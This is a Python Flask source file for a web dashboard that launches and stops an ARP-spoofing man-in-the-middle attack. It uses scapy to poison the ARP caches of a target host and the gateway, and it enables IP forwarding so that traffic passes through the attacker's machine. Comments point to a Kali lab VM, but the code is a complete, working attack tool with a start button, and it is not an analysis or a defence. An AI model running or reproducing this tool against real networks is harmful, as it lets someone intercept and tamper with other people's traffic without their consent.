from flask import Flask, render_template, jsonify, request
import threading
import time
import scapy.all as scapy
import sys
import os
import signal

app = Flask(__name__)

# --- GLOBAL STATE (Thread Safe) ---
STOP_EVENT = threading.Event()
ATTACK_THREAD = None

# Default Configuration and State Tracking
STATUS = {
    "state": "IDLE",
    "target": "192.168.1.20",
    "gateway": "192.168.1.1",
    "interface": "eth0",  # Default interface
    "packets": 0,
    "target_mac": "N/A",
    "logs": ["System initialized. Ready for command."]
}

# --- SYSTEM & UTILITY FUNCTIONS ---

def log_msg(message):
    """Adds a timestamped message to the global log buffer."""
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    if len(STATUS["logs"]) > 50:
        STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    print(full_msg) # Also print to terminal for debugging

def set_ip_forwarding(value):
    """Sets the IP forwarding state (1 to enable, 0 to disable). Requires sudo."""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except Exception as e:
        log_msg(f"FATAL: Failed to set IP forwarding. Run script with sudo: {e}")
        sys.exit(1)

def get_mac(ip):
    """Sends an ARP request to get the MAC address for a given IP."""
    # Explicitly use the current interface
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    # Force interface use and set timeout
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=STATUS["interface"])[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip, target_mac):
    """Sends a forged ARP response."""
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=STATUS["interface"])

def restore(destination_ip, source_ip):
    """Restores the victim's ARP table."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if not destination_mac or not source_mac:
        log_msg("[-] WARNING: Could not resolve MACs for clean exit. Manual cleanup required.")
        return
        
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

# --- ATTACK THREAD LOGIC ---

def run_attack_loop(target_ip, gateway_ip):
    """The main attack loop run in a separate thread."""
    global ATTACK_THREAD
    
    # Initial setup for the thread
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    log_msg(f"🚀 Attack launched against {target_ip} via {STATUS['interface']}")
    set_ip_forwarding(1)
    
    # ... inside run_attack_loop ...
    try:
        while not STOP_EVENT.is_set():
            # 1. Get MAC addresses for BOTH targets
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip) # This is the Server's MAC

            if target_mac and gateway_mac:
                # Log success only on first resolution
                if STATUS["target_mac"] == "N/A":
                    STATUS["target_mac"] = target_mac
                    log_msg(f"✅ Targets Resolved: Victim={target_mac} | Server={gateway_mac}")
                
                # --- POISON BOTH SIDES (The Fix) ---
                
                # 1. Tell Victim that WE are the Server
                spoof(target_ip, gateway_ip, target_mac)

                # 2. Tell Server that WE are the Victim
                spoof(gateway_ip, target_ip, gateway_mac)
                
                STATUS["packets"] += 2
            else:
                log_msg(f"⚠️ Retrying... Could not find both MACs. (Victim: {target_mac}, Server: {gateway_mac})")
                
            time.sleep(2)

    except Exception as e:
        log_msg(f"CRITICAL THREAD ERROR: {e}")
    
    finally:
        # --- CLEANUP ---
        log_msg("🛑 Stopping thread... Restoring ARP tables.")
        restore(target_ip, gateway_ip)
        set_ip_forwarding(0)
        STATUS["state"] = "IDLE"
        STATUS["target_mac"] = "N/A"
        STOP_EVENT.clear() 

# --- FLASK ROUTES ---

@app.route('/')
def index():
    """Renders the main dashboard page."""
    # Check if a specific interface is configured, default to eth0 if not.
    if scapy.conf.iface is None:
         STATUS["interface"] = 'eth0'
    return render_template('index.html', data=STATUS)

@app.route('/update')
def update():
    """Provides real-time status and logs via AJAX."""
    return jsonify(STATUS)

@app.route('/action', methods=['POST'])
def action():
    """Handles START/STOP button clicks."""
    global ATTACK_THREAD
    req = request.json
    action_type = req.get('action')
    
    if action_type == 'start':
        if STATUS["state"] == "RUNNING":
            return jsonify({"status": "error", "message": "Attack already running!"})
        
        # Update configs from UI
        STATUS["target"] = req.get('target', STATUS["target"])
        STATUS["gateway"] = req.get('gateway', STATUS["gateway"])
        STATUS["interface"] = req.get('interface', STATUS["interface"])
        scapy.conf.iface = STATUS["interface"] # Set Scapy's interface globally
        
        # Start Thread, passing the IPs as arguments
        ATTACK_THREAD = threading.Thread(target=run_attack_loop, 
                                         args=(STATUS["target"], STATUS["gateway"]))
        ATTACK_THREAD.daemon = True
        ATTACK_THREAD.start()
        return jsonify({"status": "success", "message": "Attack launched"})
    
    elif action_type == 'stop':
        if STATUS["state"] == "IDLE":
            return jsonify({"status": "error", "message": "No attack running"})
        
        # Signal the thread to break its loop and clean up
        STOP_EVENT.set()
        return jsonify({"status": "success", "message": "Stopping attack..."})
    
    return jsonify({"status": "error", "message": "Invalid action."})

if __name__ == '__main__':
    # Initial setup for Kali: set Scapy interface and start server
    scapy.conf.iface = STATUS["interface"]
    # We must use host='0.0.0.0' for accessibility in the VM
    app.run(host='0.0.0.0', port=5000, debug=False)